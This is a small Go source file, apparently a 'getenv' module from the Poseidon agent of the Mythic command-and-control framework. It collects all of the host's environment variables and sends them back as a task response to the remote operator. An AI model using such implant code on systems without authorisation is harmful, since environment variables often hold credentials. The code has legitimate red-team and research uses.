package getenv

import (
	// Standard
	"os"
	"sort"
	"strings"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := task.NewResponse()
	envString := os.Environ()
	sort.Strings(envString)
	msg.UserOutput = strings.Join(envString, "\n")
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
